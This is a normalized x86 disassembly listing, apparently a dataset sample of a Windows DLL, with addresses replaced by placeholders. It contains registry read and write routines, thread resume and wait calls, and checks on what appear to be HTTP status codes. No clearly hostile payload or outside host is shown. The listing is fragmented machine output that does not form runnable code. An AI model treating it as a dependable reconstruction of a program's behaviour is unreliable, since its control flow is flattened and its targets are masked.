lea ecx [ ebp - 0x58 ]
call sub_10001362
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0xb8 ]
add edi 0x1c
push eax
mov [ ebp - 0x4 ] 0x7
call sub_1001517a
pop ecx
pop ecx
lea ecx [ ebp - 0x3c ]
push ecx
mov ecx eax
mov [ ebp - 0x4 ] 0x8
call sub_10014f5b
lea esi [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x7
call sub_100150b1
push ebx
push 0x1
lea ecx [ ebp - 0x58 ]
call sub_1000264e
lea ecx [ ebp - 0x3c ]
call sub_10014b74
call sub_1002b392
retn
sub_10014619
push 0x120
mov eax sub_1005232a
call sub_1002b345
mov eax [ ebp + 0x8 ]
mov edi edx
mov edx [ eax + 0x14 ]
xor esi esi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x54 ] esi
cmp edx esi
je r-xdata
push edx
push [ ebp - 0x54 ]
push edi
call sub_1001943e
push edi
call sub_1001950b
cmp eax 0xc8
je r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_1002b3a1
retn
cmp eax 0x197
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x38 ] 0x7
call sub_10002630
lea ecx [ ebp - 0x34 ]
call sub_10001bdf
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10014374
mov esi eax
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000253c
push 0xffffffff
push 0x0
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_1000253c
lea esi [ ebp - 0xb4 ]
call sub_100144e7
mov [ ebp - 0x4 ] ebx
jmp sub_10014715
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001ebc
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4 ] esi
call sub_10001eec
push r--data
lea eax [ ebp - 0x12c ]
push eax
call sub_1002ae74
mov [ ebp - 0x54 ] eax
sub_10014715
mov esi r--data
push esi
lea ecx [ ebp - 0x34 ]
call sub_1000c634
test eax eax
je r-xdata
lea ebx [ ebp - 0xb4 ]
call sub_10020404
mov esi eax
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000253c
push 0xffffffff
push 0x0
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_1000253c
mov esi ebx
mov [ ebp - 0x4 ] 0x1
call sub_100144e7
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x58 ]
push [ ebp - 0x54 ]
push edi
call sub_1001943e
push edi
call sub_1001950b
cmp eax 0xc8
je r-xdata
push esi
lea ecx [ ebp - 0x50 ]
call sub_1000c634
test eax eax
je r-xdata
lea ecx [ ebp - 0x50 ]
call sub_100144ff
push r--data
lea ecx [ ebp - 0x98 ]
call sub_10001ebc
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x104 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001eec
push r--data
lea eax [ ebp - 0x104 ]
jmp r-xdata
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
push eax
call sub_1002ae74
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x38 ] 0x7
call sub_10002630
lea ecx [ ebp - 0x34 ]
call sub_10001bdf
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
lea ecx [ ebp - 0xb4 ]
mov [ ebp - 0x4 ] 0x2
call sub_10014374
mov esi eax
push 0xffffffff
push 0x0
push esi
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000253c
push 0xffffffff
push 0x0
add esi 0x1c
push esi
lea ecx [ ebp - 0x34 ]
call sub_1000253c
lea esi [ ebp - 0xb4 ]
call sub_100144e7
mov [ ebp - 0x4 ] ebx
jmp sub_10014715
mov ecx [ ebp - 0x3c ]
add ecx ecx
push ecx
push eax
push 0x2b
push edi
call sub_10019681
cmp [ ebp - 0x1c ] 0x8
mov eax [ ebp - 0x30 ]
jae r-xdata
lea eax [ ebp - 0x4c ]
mov ecx [ ebp - 0x20 ]
add ecx ecx
push ecx
push eax
push 0x2c
push edi
call sub_10019681
push [ ebp - 0x5c ]
mov ecx [ ebp - 0x58 ]
push [ ebp - 0x54 ]
push edi
call sub_1001943e
push edi
call sub_1001950b
cmp eax 0xc8
je r-xdata
lea eax [ ebp - 0x30 ]
lea esi [ ebp - 0x50 ]
call sub_100144e7
call sub_1002b3a1
retn
cmp eax 0x197
je r-xdata
push r--data
lea ecx [ ebp - 0x7c ]
call sub_10001ebc
lea eax [ ebp - 0x7c ]
push eax
lea ecx [ ebp - 0xdc ]
mov [ ebp - 0x4 ] 0x5
call sub_10001eec
push r--data
lea eax [ ebp - 0xdc ]
jmp r-xdata
sub_1001486a
push ebp
mov ebp esp
sub esp 0x30
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
je r-xdata
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
mov ebx eax
lea esi [ ebp - 0x2c ]
call sub_10015eca
push r--data
mov eax esi
push eax
call sub_1002ae74
sub_100148a0
push esi
push edi
mov edi [ esp + 0xc ]
push edi
mov esi ecx
call sub_10013b70
mov [ esi ] r--data
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
pop edi
mov eax esi
pop esi
retn 0x4
sub_100148e3
push 0x48
mov eax sub_100502fd
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] r--data
mov [ eax + 0x4 ] edx
and [ ebp - 0x4 ] 0x0
mov [ eax ] r--data
mov edx [ ecx + 0x4 ]
mov [ eax + 0x8 ] edx
cmp [ ecx ] 0x0
jne r-xdata
call sub_1002b37e
retn 0x4
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
call sub_10001eec
push r--data
lea eax [ ebp - 0x54 ]
push eax
call sub_1002ae74
sub_10014945
push 0x20
mov eax sub_10050c1d
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ ResumeThread@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0xffffffff
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call [ GetLastError@IAT ]
cmp eax 0x12
je r-xdata
call sub_1002b37e
retn 0x4
sub_100149a9
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005109e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
push r--data
lea ecx [ esp + 0x10 ]
mov esi eax
call sub_10001ebc
and [ esp + 0x78 ] 0x0
lea eax [ esp + 0xc ]
push eax
cmp esi 0xffffffff
sete al
movzx eax al
push eax
call sub_1001486a
or [ esp + 0x80 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x14 ]
call sub_100020e2
test esi esi
je r-xdata
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push r--data
lea ecx [ esp + 0x2c ]
call sub_10001ebc
lea eax [ esp + 0x28 ]
push eax
lea ecx [ esp + 0x48 ]
mov [ esp + 0x7c ] 0x1
call sub_10001eec
push r--data
lea eax [ esp + 0x48 ]
push eax
call sub_1002ae74
sub_10014a6c
push 0x4c
mov eax sub_10050885
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea edi [ esi + 0x4 ]
and [ edi ] 0x0
lea ebx [ esi + 0x8 ]
and [ ebx ] 0x0
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100025cf
mov ecx [ ebp + 0x14 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x10 ] 0x0
push r--data
call sub_1000c634
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ edi ] ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
mov ebx [ ebp + 0x14 ]
lea eax [ ebp - 0x2c ]
push eax
lea esi [ ebp - 0x58 ]
mov [ ebp - 0x4 ] 0x1
call sub_10015eca
push r--data
mov eax esi
push ebx
push edi
xor ebx ebx
push ebx
push 0xf003f
push ebx
push [ ebp - 0x10 ]
push ebx
push eax
push [ ebp + 0xc ]
call [ RegCreateKeyExW@IAT ]
mov [ ebp + 0x14 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_1002b37e
retn 0x10
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
lea eax [ ebp - 0x2c ]
push eax
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x2
call sub_10001eec
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
push eax
call sub_1002ae74
sub_10014b74
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
call sub_1000264e
pop esi
retn
push eax
call [ RegCloseKey@IAT ]
and [ esi + 0x4 ] 0x0
sub_10014b9d
push 0x88
mov eax sub_1005084c
call sub_1002b2a6
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ eax + 0x18 ] 0x8
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
jb r-xdata
add eax 0x4
add eax 0x4
mov eax [ eax ]
jmp r-xdata
push 0x20
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10001ebc
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x1
push eax
mov ebx esi
mov edi [ RegQueryValueExW@IAT ]
lea ecx [ ebp - 0x14 ]
push ecx
push ebx
lea ecx [ ebp - 0x10 ]
push ecx
push ebx
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call edi
mov esi eax
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp - 0x14 ]
call sub_100172b3
mov esi eax
jmp r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
push esi
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] esi
call sub_10015631
push esi
lea eax [ ebp - 0x1c ]
push esi
push eax
call sub_1000d3de
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ esi + 0x4 ]
mov ecx [ esi + 0x4 ]
jmp r-xdata
mov esi [ ebp + 0x10 ]
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push esi
push ecx
push ecx
mov ecx [ ebp - 0x1c ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x18 ]
mov [ ebp + 0x10 ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000af36
push [ ebp - 0x10 ]
lea eax [ ebp - 0x94 ]
push eax
call sub_1001505e
mov [ ebp - 0x4 ] 0x5
push [ ebp + 0xc ]
mov ecx eax
call sub_10014d1f
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x20 ] 0x1
mov [ ebp - 0x4 ] 0x3
call sub_100150b1
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x40 ]
call sub_10001ebc
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
push eax
mov ebx edi
jmp r-xdata
lea edx [ ebp - 0x14 ]
push edx
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push ebx
push ecx
push [ eax + 0x4 ]
call edi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ ebp + 0xc ]
call sub_1002b37e
retn 0xc
call sub_1000af0a
lea esi [ ebp - 0x6c ]
call sub_10015eca
push r--data
mov eax esi
push eax
call sub_1002ae74
sub_10014d1f
push 0x0
mov eax sub_100507eb
call sub_1002b2a6
mov edi ecx
mov esi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ esi ] eax
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_1000af36
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
call sub_100025cf
mov eax esi
call sub_1002b37e
retn 0x4
sub_10014d60
push 0x90
mov eax sub_10051066
call sub_1002b30f
mov eax [ ebp + 0x8 ]
xor edi edi
push edi
mov [ ebp - 0x44 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x48 ] edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x38 ] eax
call sub_10004a57
xor ebx ebx
inc ebx
push 0x20
mov [ ebp - 0x4 ] ebx
call sub_1002738b
pop ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
xor esi esi
push [ ebp + 0x18 ]
mov esi eax
call sub_100172b3
mov esi eax
jmp r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] bl
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x34 ] esi
call sub_10015631
push esi
lea eax [ ebp - 0x34 ]
push esi
push eax
call sub_1000d3de
add esp 0xc
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x3c ] edi
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea edx [ ebp + 0x18 ]
push edx
push eax
lea eax [ ebp - 0x3c ]
push eax
push edi
lea eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x44 ]
push ecx
push [ ebp + 0x10 ]
push [ eax + 0x4 ]
call [ RegEnumValueW@IAT ]
mov esi eax
cmp esi edi
je r-xdata
lea ecx [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x8
mov ecx [ ebp - 0x28 ]
jae r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
call sub_1001534a
mov ecx [ ebp - 0x34 ]
push edi
push [ ebp + 0x18 ]
add ecx 0x4
call sub_1000133e
lea eax [ ebp - 0x2c ]
push eax
push ecx
push ecx
mov ecx [ ebp - 0x34 ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x40 ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000af36
push [ ebp - 0x3c ]
lea eax [ ebp - 0x70 ]
push eax
call sub_1001505e
mov [ ebp - 0x4 ] 0x5
push [ ebp - 0x38 ]
mov ecx eax
call sub_10014d1f
lea esi [ ebp - 0x70 ]
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0x3
call sub_100150b1
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x30 ]
cmp ecx edi
je r-xdata
push r--data
lea ecx [ ebp - 0x64 ]
call sub_10001ebc
lea eax [ ebp - 0x64 ]
mov ebx esi
push eax
lea esi [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4
call sub_10015eca
push r--data
mov eax esi
push eax
call sub_1002ae74
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov eax [ ebp - 0x38 ]
call sub_1002b392
retn 0x14
call sub_1000af0a
sub_10014ecd
push 0x4c
mov eax sub_100507c5
call sub_1002b2a6
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x1c ] 0x10
mov edx [ eax + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
lea esi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x1
call sub_10015eca
push r--data
mov eax esi
push eax
call sub_1002ae74
push edx
push eax
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push [ eax + 0x4 ]
call [ RegSetValueExW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
call sub_1002b37e
retn 0x10
call sub_1000af0a
sub_10014f5b
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10051008
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
mov edi ecx
push ecx
push ecx
mov esi esp
mov eax edi
mov [ esp + 0x14 ] esp
call sub_100150ca
and [ esp + 0x40 ] 0x0
lea eax [ esp + 0x18 ]
push eax
mov eax edi
call sub_100150de
mov [ esp + 0x40 ] 0x1
mov edi [ edi ]
push edi
push [ ebp + 0x8 ]
mov ecx eax
mov [ esp + 0x48 ] 0x2
call sub_10014ecd
push 0x0
push 0x1
lea ecx [ esp + 0x18 ]
call sub_1000264e
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10014fe0
push 0x4c
mov eax sub_1005079a
call sub_1002b2a6
mov eax [ ebp + 0xc ]
xor esi esi
cmp [ eax + 0x18 ] 0x8
mov [ ebp + 0xc ] esi
mov [ ebp - 0x10 ] esi
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp ebx esi
je r-xdata
xor al al
jmp r-xdata
lea ecx [ ebp + 0xc ]
push ecx
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push esi
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ RegQueryValueExW@IAT ]
mov ebx eax
cmp ebx 0x2
jne r-xdata
mov al 0x1
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] esi
push eax
lea esi [ ebp - 0x58 ]
call sub_10015eca
push r--data
mov eax esi
push eax
call sub_1002ae74
call sub_1002b37e
retn 0x8
sub_1001505e
push 0x0
mov eax sub_10050777
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ esi + 0x8 ]
call sub_1000af36
push [ ebp + 0x18 ]
lea ecx [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x1
call sub_100025cf
or [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
mov eax esi
call sub_1002b37e
retn 0x14
call sub_1000af0a
sub_100150f9
push 0x14
mov eax sub_10050749
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
lea esi [ ebp - 0x20 ]
call sub_100150ca
mov edi eax
mov eax [ ebp + 0x8 ]
xor ebx ebx
inc ebx
lea esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] ebx
call sub_100150ca
mov [ ebp - 0x4 ] 0x2
mov eax [ eax ]
cmp [ eax + 0x1c ] 0x10
mov ecx [ edi ]
mov ecx [ ecx + 0x18 ]
jb r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
call sub_1000af0a
dec ecx
shr ecx 0x1
push ecx
mov ecx [ ebp + 0xc ]
push eax
call sub_10004a31
mov [ ebp - 0x4 ] bl
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
test ecx ecx
je r-xdata
mov eax [ ebp + 0xc ]
call sub_1002b37e
retn 0x8
call sub_1000af0a
sub_1001517a
push 0x3c
mov eax sub_10050fdd
call sub_1002b2a6
and [ ebp - 0x14 ] 0x0
push 0x20
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
test esi esi
je r-xdata
xor esi esi
cmp [ edi + 0x18 ] 0x8
mov ecx [ edi + 0x14 ]
jb r-xdata
lea ecx [ eax + 0x8 ]
mov ecx [ eax + 0x8 ]
jmp r-xdata
lea eax [ edi + 0x4 ]
mov eax [ edi + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
call sub_1000af0a
push [ ebp + 0xc ]
mov eax [ edi + 0x14 ]
push ecx
push ecx
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ ebp - 0x20 ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0xc ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000af36
push ebx
lea eax [ ebp - 0x48 ]
push eax
call sub_1001505e
mov [ ebp - 0x4 ] 0x3
push [ ebp + 0x8 ]
mov ecx eax
call sub_10014d1f
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] 0x2
call sub_100150b1
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
push esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] esi
call sub_10015631
push esi
lea eax [ ebp - 0x20 ]
push esi
push eax
call sub_1000d3de
add esp 0xc
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x1c ] 0x10
jb r-xdata
lea ecx [ ecx + ecx + 0x2 ]
push ecx
push eax
call sub_100172e8
mov esi eax
jmp r-xdata
sub_1001525d
push 0x3c
mov eax sub_10050fdd
call sub_1002b2a6
and [ ebp - 0x14 ] 0x0
and [ ebp - 0x10 ] 0x0
push 0x20
call sub_1002738b
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
xor edi edi
inc edi
mov [ ebp - 0x4 ] edi
test esi esi
je r-xdata
xor esi esi
push 0x4
lea eax [ ebp - 0x10 ]
push eax
call sub_100172e8
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
call sub_1000af0a
mov [ ebp - 0x4 ] 0x0
push esi
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] esi
call sub_10015631
push esi
lea eax [ ebp - 0x20 ]
push esi
push eax
call sub_1000d3de
add esp 0xc
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x2
push ecx
push ecx
mov ecx [ ebp - 0x20 ]
mov eax esp
mov [ eax ] ecx
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0xc ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000af36
push 0x4
lea eax [ ebp - 0x48 ]
push eax
call sub_1001505e
mov [ ebp - 0x4 ] 0x3
push [ ebp + 0x8 ]
mov ecx eax
call sub_10014d1f
lea esi [ ebp - 0x48 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x2
call sub_100150b1
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
sub_1001531a
push 0x0
mov eax sub_100505a8
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
push ecx
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] esp
call sub_1001536e
xor eax eax
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_1001534a
mov edx [ ecx + 0x14 ]
mov eax [ esp + 0x4 ]
cmp eax edx
ja r-xdata
push [ esp + 0x8 ]
sub eax edx
push eax
call sub_10005db8
push 0xffffffff
push eax
call sub_100022bb
jmp r-xdata
retn 0x8
sub_1001536e
push 0x0
push 0x1
call sub_10001bf4
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
mov [ eax ] esi
jmp r-xdata
mov [ esi ] eax
mov eax esi
retn 0x4
sub_1001538a
push 0x50
mov eax sub_10050f85
call sub_1002b345
mov eax [ ebp + 0x8 ]
mov esi ecx
mov ecx [ esi + 0xc ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x5c ] eax
test ecx ecx
jne r-xdata
mov eax [ esi + 0x14 ]
sub eax ecx
push 0x1c
cdq
pop edi
idiv edi
mov ebx eax
xor ebx ebx
jmp r-xdata
lea edx [ eax + 0x1 ]
cmp ebx edx
jae r-xdata
call sub_100155d9
mov edi [ esi + 0x10 ]
mov eax edi
sub eax ecx
push 0x1c
cdq
pop ecx
idiv ecx
mov ecx 0x9249249
mov edx ecx
sub edx eax
cmp edx 0x1
jae r-xdata
mov eax edi
sub eax [ ebp + 0x10 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x5c ]
cmp eax 0x1
jae r-xdata
mov eax ebx
shr eax 0x1
sub ecx eax
cmp ecx ebx
jae r-xdata
lea ecx [ ebp - 0x4c ]
call sub_100025cf
mov [ ebp - 0x4 ] 0x5
mov edi [ esi + 0x10 ]
lea ebx [ edi - 0x1c ]
push edi
mov edx edi
mov ecx ebx
call sub_100019ba
push [ ebp + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax edi
mov ecx ebx
call sub_100019fa
pop ecx
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1c ]
push ecx
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x4c ]
lea ecx [ ebp - 0x30 ]
call sub_100025cf
push 0x2
pop edi
mov [ ebp - 0x4 ] edi
mov ecx [ ebp + 0x10 ]
push [ esi + 0x10 ]
lea edx [ ecx + 0x1c ]
call sub_100019ba
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax ecx
sub eax [ ebp + 0x10 ]
push 0x1c
pop ebx
cdq
idiv ebx
xor edx edx
inc edx
sub edx eax
push edx
push ecx
call sub_100015ef
mov [ ebp - 0x4 ] edi
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x10 ]
add esi 0xffffffe4
push esi
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x30 ]
jmp r-xdata
add ebx eax
xor ebx ebx
jmp r-xdata
push 0x0
push 0x1
call sub_1000264e
test ebx ebx
ja r-xdata
mov ebx edx
cmp ebx edx
jae r-xdata
mov ecx ebx
call sub_10001a37
push 0x0
call sub_1002738b
pop ecx
jmp r-xdata
mov eax [ ebp - 0x50 ]
imul ebx ebx 0x1c
imul edi edi 0x1c
add ebx eax
add edi eax
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] edi
mov [ esi + 0xc ] eax
jmp r-xdata
push [ esi + 0x10 ]
mov eax ecx
call sub_100139b7
push [ esi + 0xc ]
call sub_100272e8
pop ecx
mov [ ebp - 0x50 ] eax
mov eax [ ebp + 0x10 ]
sub eax [ esi + 0xc ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x5c ]
and [ ebp - 0x58 ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x1
mov edi eax
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
mov [ ebp - 0x54 ] edi
push eax
call sub_100015ef
push [ ebp + 0x10 ]
mov edx [ ebp - 0x50 ]
mov ecx [ esi + 0xc ]
mov [ ebp - 0x58 ] 0x1
call sub_100019ba
push [ esi + 0x10 ]
mov ecx [ ebp + 0x10 ]
lea edx [ edi + 0x1 ]
imul edx edx 0x1c
add edx [ ebp - 0x50 ]
mov [ ebp - 0x58 ] 0x2
call sub_100019ba
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
sub eax ecx
push 0x1c
cdq
pop edi
idiv edi
mov edi eax
inc edi
test ecx ecx
je r-xdata
call sub_1002b3a1
retn 0xc
sub_100154af
cmp [ ebp - 0x58 ] 0x1
jle r-xdata
xor esi esi
cmp [ ebp - 0x58 ] esi
jle r-xdata
mov ecx [ ebp - 0x54 ]
